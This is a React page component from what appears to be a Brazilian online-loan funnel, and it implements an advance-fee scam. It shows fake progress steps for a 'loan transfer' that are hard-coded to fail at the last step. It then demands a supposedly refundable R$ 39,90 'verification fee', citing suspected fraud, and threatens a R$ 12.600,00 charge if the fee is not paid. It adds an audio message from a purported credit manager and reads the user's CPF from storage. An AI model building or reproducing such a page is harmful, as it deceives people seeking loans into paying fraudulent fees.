import { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { AlertTriangle, Loader2, CheckCircle2, XCircle, Play, Pause } from 'lucide-react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import UserMenu from '../components/UserMenu';
import { getUserName } from '../utils/funnelStorage';
import { navigateWithParams } from '../utils/urlParams';
import { trackPurchase } from '../utils/facebookPixel';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';

interface ProcessingStep {
  id: number;
  label: string;
  status: 'pending' | 'loading' | 'completed' | 'error';
  progress: number;
}

export default function Upsell1Page() {
  const navigate = useNavigate();
  const location = useLocation();
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [loadingSteps, setLoadingSteps] = useState<ProcessingStep[]>([
    { id: 1, label: 'Analisando Dados…', status: 'pending', progress: 0 },
    { id: 2, label: 'Taxa de verificação…', status: 'pending', progress: 0 },
    { id: 3, label: 'Transferindo empréstimo…', status: 'pending', progress: 0 },
    { id: 4, label: 'Concluindo pagamento...', status: 'pending', progress: 0 }
  ]);
  const [showPopupTaxa, setShowPopupTaxa] = useState(false);
  const [exibirErroFinal, setExibirErroFinal] = useState(false);
  const [mostrarTaxa, setMostrarTaxa] = useState(false);
  const [popupCalculandoProgress, setPopupCalculandoProgress] = useState(0);
  const [showAudio, setShowAudio] = useState(false);
  const [isPlaying, setIsPlaying] = useState(false);
  const [currentTime, setCurrentTime] = useState(0);
  const [duration, setDuration] = useState(0);
  const audioRef = useRef<HTMLAudioElement>(null);

  const handleMenuClick = () => setIsMenuOpen(!isMenuOpen);
  const handleMenuClose = () => setIsMenuOpen(false);

  const formatTime = (time: number) => {
    const minutes = Math.floor(time / 60);
    const seconds = Math.floor(time % 60);
    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
  };

  const togglePlayPause = () => {
    if (audioRef.current) {
      if (isPlaying) {
        audioRef.current.pause();
      } else {
        audioRef.current.play();
      }
      setIsPlaying(!isPlaying);
    }
  };

  const handleEnded = () => {
    setIsPlaying(false);
    setCurrentTime(0);
  };

  useEffect(() => {
    const audio = audioRef.current;
    if (!audio) return;

    const updateTime = () => setCurrentTime(audio.currentTime);
    const updateDuration = () => setDuration(audio.duration);

    audio.addEventListener('timeupdate', updateTime);
    audio.addEventListener('loadedmetadata', updateDuration);
    audio.addEventListener('ended', handleEnded);

    return () => {
      audio.removeEventListener('timeupdate', updateTime);
      audio.removeEventListener('loadedmetadata', updateDuration);
      audio.removeEventListener('ended', handleEnded);
    };
  }, []);

  useEffect(() => {
    trackPurchase({
      value: 57.47,
      currency: 'BRL',
      content_type: 'product',
      content_name: 'Desafio 30 dias',
      num_items: 1,
    });

    saveFunnelData({
      currentStep: '/upsell-1'
    });
  }, []);

  useEffect(() => {
    const processSteps = async () => {
      const totalDuration = 9000;
      const steps = loadingSteps.length;
      const stepDuration = totalDuration / steps;

      for (let stepIndex = 0; stepIndex < loadingSteps.length; stepIndex++) {
        const isLastStep = stepIndex === loadingSteps.length - 1;
        const maxProgress = isLastStep ? 85 : 100;
        const increment = 5;
        const progressSteps = maxProgress / increment;
        const progressDelay = (stepDuration * 0.8) / progressSteps;

        setLoadingSteps(prev => prev.map((step, idx) =>
          idx === stepIndex ? { ...step, status: 'loading' } : step
        ));

        for (let progress = 0; progress <= maxProgress; progress += increment) {
          await new Promise(resolve => setTimeout(resolve, progressDelay));
          setLoadingSteps(prev => prev.map((step, idx) =>
            idx === stepIndex ? { ...step, progress } : step
          ));
        }

        if (isLastStep) {
          await new Promise(resolve => setTimeout(resolve, stepDuration * 0.2));
          setLoadingSteps(prev => prev.map((step, idx) =>
            idx === stepIndex ? { ...step, status: 'error' } : step
          ));
          setExibirErroFinal(true);
        } else {
          setLoadingSteps(prev => prev.map((step, idx) =>
            idx === stepIndex ? { ...step, status: 'completed', progress: 100 } : step
          ));
        }

        if (!isLastStep) {
          await new Promise(resolve => setTimeout(resolve, stepDuration * 0.2));
        }
      }
    };

    processSteps();
  }, []);

  const handleCalcularTaxa = () => {
    setShowPopupTaxa(true);
    setPopupCalculandoProgress(0);

    const steps = ['Consultando dados…', 'Validando pendência…', 'Calculando taxa…'];
    let currentStep = 0;

    const interval = setInterval(() => {
      setPopupCalculandoProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(() => {
            setShowPopupTaxa(false);
            setMostrarTaxa(true);
            setShowAudio(true);

            setTimeout(() => {
              if (audioRef.current) {
                audioRef.current.volume = 0.6;
                audioRef.current.play().catch(err => {
                  console.log('Autoplay blocked:', err);
                }).then(() => {
                  setIsPlaying(true);
                });
              }
            }, 2000);
          }, 300);
          return 100;
        }
        return prev + 3.33;
      });

      if (currentStep < steps.length - 1 && popupCalculandoProgress > (currentStep + 1) * 33) {
        currentStep++;
      }
    }, 100);
  };

  const handleRegularizarTaxa = () => {
    const { userData } = location.state || {};
    const cpf = userData?.cpf || sessionStorage.getItem('user_cpf') || localStorage.getItem('user_cpf');
    console.log('Upsell1 - CPF from storage:', cpf);

    if (!cpf) {
      console.error('CPF not found in storage. Redirecting to home.');
      navigate('/');
      return;
    }

    navigateWithParams(
      navigate,
      '/upsell-payment',
      location,
      {
        amount: 39.90,
        title: 'Taxa de Verificação',
        redirectPath: '/upsell-2',
        cpf: cpf,
        userData: userData
      }
    );
  };

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex flex-col">
      <Header showUserIcon={true} onMenuClick={handleMenuClick} />
      <UserMenu isOpen={isMenuOpen} onClose={handleMenuClose} userName={getUserName()} />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6 md:p-8 pt-24 sm:pt-28 pb-20">
        <div className="w-full max-w-lg">
          <div className="bg-white rounded-3xl shadow-xl p-8 sm:p-10 mb-6 border border-gray-100">
            <div className="text-center mb-8">
              <h2 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-3">
                Transferência do Empréstimo
              </h2>
              <p className="text-base text-gray-600 leading-relaxed">
                Agora estamos validando seus dados e concluindo as últimas verificações do sistema.
              </p>
            </div>
            <div className="space-y-5">
              {loadingSteps.map((step, index) => (
                <div
                  key={step.id}
                  className="animate-slide-up"
                  style={{ animationDelay: `${index * 100}ms` }}
                >
                  <div className="flex items-center gap-4 mb-3">
                    <div className={`flex-shrink-0 w-10 h-10 rounded-full flex items-center justify-center transition-all duration-300 ${
                      step.status === 'loading' ? 'bg-purple-100' :
                      step.status === 'completed' ? 'bg-green-100' :
                      step.status === 'error' ? 'bg-red-100' : 'bg-gray-100'
                    }`}>
                      {step.status === 'loading' && (
                        <Loader2 className="w-5 h-5 text-purple-600 animate-spin" />
                      )}
                      {step.status === 'completed' && (
                        <CheckCircle2 className="w-5 h-5 text-green-600" />
                      )}
                      {step.status === 'error' && (
                        <XCircle className="w-5 h-5 text-red-600" />
                      )}
                      {step.status === 'pending' && (
                        <div className="w-5 h-5 rounded-full border-2 border-gray-300" />
                      )}
                    </div>
                    <span className={`text-base font-semibold transition-colors duration-300 ${
                      step.status === 'error' ? 'text-red-600' :
                      step.status === 'completed' ? 'text-green-600' :
                      step.status === 'loading' ? 'text-purple-600' : 'text-gray-400'
                    }`}>
                      {step.label}
                    </span>
                  </div>
                  {(step.status === 'loading' || step.status === 'error') && (
                    <div className="ml-14 pr-14 bg-gray-100 rounded-full h-2.5 overflow-hidden shadow-inner">
                      <div
                        className={`h-full transition-all duration-300 ${
                          step.status === 'error' ? 'bg-gradient-to-r from-red-500 to-red-600' : 'bg-gradient-to-r from-purple-500 to-purple-600'
                        }`}
                        style={{ width: `${step.progress}%` }}
                      />
                    </div>
                  )}
                </div>
              ))}
            </div>

            {exibirErroFinal && (
              <div className="mt-6 p-4 bg-red-50 border-2 border-red-200 rounded-xl animate-fade-in">
                <div className="flex gap-3">
                  <AlertTriangle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                  <div>
                    <h3 className="text-sm font-semibold text-red-900 mb-1">
                      Falha na conclusão da operação
                    </h3>
                    <p className="text-xs text-red-700 leading-relaxed">
                      Identificamos uma pendência obrigatória relacionada à Taxa de Verificação.
                      Para prosseguir com a liberação do empréstimo, você precisa regularizar a taxa reembolsável.
                    </p>
                  </div>
                </div>
              </div>
            )}
          </div>

          {exibirErroFinal && (
            <div className="bg-white rounded-2xl shadow-lg p-6 sm:p-8 mb-6 animate-fade-in">
              <div className="text-center mb-6">
                <div className="inline-flex items-center justify-center w-16 h-16 bg-red-100 rounded-full mb-4">
                  <AlertTriangle className="w-8 h-8 text-red-600" />
                </div>
                <h2 className="text-xl font-bold text-gray-900 mb-2">
                  ATENÇÃO!
                </h2>
                <p className="text-lg font-semibold text-red-600 mb-4">
                  Confirmação necessária
                </p>
                <p className="text-sm text-gray-700 leading-relaxed">
                  Durante a transferência do seu empréstimo, identificamos uma pendência relacionada à <strong>taxa de verificação</strong>, necessária para garantir a segurança do processo e evitar possíveis fraudes.
                </p>
                <p className="text-sm text-gray-700 leading-relaxed mt-3">
                  Essa taxa é <strong className="text-green-600">100% reembolsável</strong> e será devolvida automaticamente após a confirmação.
                </p>
              </div>

              {!mostrarTaxa && (
                <button
                  onClick={handleCalcularTaxa}
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-semibold py-4 px-6 rounded-xl transition-all duration-200 shadow-md hover:shadow-lg"
                >
                  CONFIRMAR VERIFICAÇÃO
                </button>
              )}
            </div>
          )}

          {mostrarTaxa && (
            <div className="space-y-4 animate-fade-in">
              {showAudio && (
                <div className="bg-gradient-to-br from-purple-50 to-white border border-purple-200 rounded-xl p-4 mb-4 animate-slide-up shadow-sm">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="w-12 h-12 flex-shrink-0">
                      <div className="w-12 h-12 rounded-full overflow-hidden border-2 border-white shadow-md">
                        <img
                          src="/Screenshot_186.png"
                          alt="Rafaela"
                          className="w-full h-full object-cover"
                        />
                      </div>
                    </div>
                    <div className="text-left flex-1">
                      <h3 className="text-base font-bold text-gray-900">
                        Rafaela
                      </h3>
                      <p className="text-xs text-purple-700">
                        Gerente de Crédito
                      </p>
                    </div>
                  </div>

                  <div className="bg-white rounded-lg p-3 shadow-sm">
                    <div className="flex items-center gap-2">
                      <button
                        onClick={togglePlayPause}
                        className="w-9 h-9 bg-purple-600 hover:bg-purple-700 text-white rounded-full flex items-center justify-center transition-colors flex-shrink-0"
                      >
                        {isPlaying ? (
                          <Pause className="w-4 h-4" />
                        ) : (
                          <Play className="w-4 h-4 ml-0.5" />
                        )}
                      </button>

                      <div className="flex-1">
                        <div className="relative w-full h-1.5 bg-gray-200 rounded-full overflow-hidden mb-0.5">
                          <div
                            className="absolute inset-y-0 left-0 bg-purple-600 rounded-full transition-all duration-100"
                            style={{ width: `${duration ? (currentTime / duration) * 100 : 0}%` }}
                          >
                            <div className="absolute right-0 top-1/2 -translate-y-1/2 w-3 h-3 bg-purple-600 rounded-full shadow-md"></div>
                          </div>
                        </div>
                        <div className="flex justify-between text-xs text-gray-500 mt-0.5">
                          <span>{formatTime(currentTime)}</span>
                          <span>{formatTime(duration)}</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              <audio
                ref={audioRef}
                src="https://audio.jukehost.co.uk/pVutsGcgGTjg0ArHKrWGVShwHmFisCXW"
                preload="auto"
              />

              <div className="bg-white rounded-2xl shadow-lg p-6 sm:p-8 border-2 border-red-300">
                <div className="mb-4">
                  <h3 className="text-base font-bold text-red-900 mb-3 uppercase">
                    MOTIVO DA TAXA: SUSPEITA DE FRAUDE
                  </h3>
                  <p className="text-sm text-gray-700 leading-relaxed">
                    Foi identificada uma taxa obrigatória de validação para garantir a segurança do processo. Após o pagamento, o valor será totalmente reembolsado.
                  </p>
                </div>

                <div className="bg-gray-50 rounded-xl p-4 mb-4">
                  <p className="text-xs text-gray-600 mb-1">Valor da taxa</p>
                  <p className="text-3xl font-bold text-purple-600">R$ 39,90</p>
                </div>

                <button
                  onClick={handleRegularizarTaxa}
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-semibold py-4 px-6 rounded-xl transition-all duration-200 shadow-md hover:shadow-lg mb-4"
                >
                  REGULARIZAR TAXA
                </button>

                <div className="bg-red-50 border-2 border-red-400 rounded-xl p-4">
                  <div className="flex gap-2">
                    <AlertTriangle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="text-xs font-semibold text-red-900 mb-1">
                        Atenção:
                      </p>
                      <p className="text-xs text-red-800 leading-relaxed">
                        Caso o valor de <strong>R$ 39,90</strong> não seja quitado, o sistema exigirá o pagamento integral de <strong>R$ 12.600,00</strong>. O não cumprimento poderá acarretar em bloqueios do empréstimo.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

      <Footer />

      {showPopupTaxa && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-fade-in">
          <div className="bg-white rounded-2xl shadow-2xl p-8 max-w-sm w-full animate-scale-in">
            <div className="text-center">
              <div className="inline-flex items-center justify-center w-16 h-16 bg-purple-100 rounded-full mb-4">
                <Loader2 className="w-8 h-8 text-purple-600 animate-spin" />
              </div>
              <h3 className="text-lg font-semibold text-gray-900 mb-3">
                Processando...
              </h3>
              <div className="space-y-2 mb-4">
                <p className={`text-sm transition-all duration-300 ${
                  popupCalculandoProgress < 33 ? 'text-purple-600 font-semibold' : 'text-gray-400'
                }`}>
                  Consultando dados…
                </p>
                <p className={`text-sm transition-all duration-300 ${
                  popupCalculandoProgress >= 33 && popupCalculandoProgress < 66 ? 'text-purple-600 font-semibold' : 'text-gray-400'
                }`}>
                  Validando pendência…
                </p>
                <p className={`text-sm transition-all duration-300 ${
                  popupCalculandoProgress >= 66 ? 'text-purple-600 font-semibold' : 'text-gray-400'
                }`}>
                  Calculando taxa…
                </p>
              </div>
              <div className="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
                <div
                  className="h-full bg-purple-600 transition-all duration-300"
                  style={{ width: `${popupCalculandoProgress}%` }}
                />
              </div>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes fade-in {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-fade-in {
          animation: fade-in 0.4s ease-out;
        }

        @keyframes slide-up {
          from {
            opacity: 0;
            transform: translateY(10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-slide-up {
          animation: slide-up 0.3s ease-out;
        }

        @keyframes scale-in {
          from {
            opacity: 0;
            transform: scale(0.95);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }
        .animate-scale-in {
          animation: scale-in 0.3s ease-out;
        }
      `}</style>
    </div>
  );
}
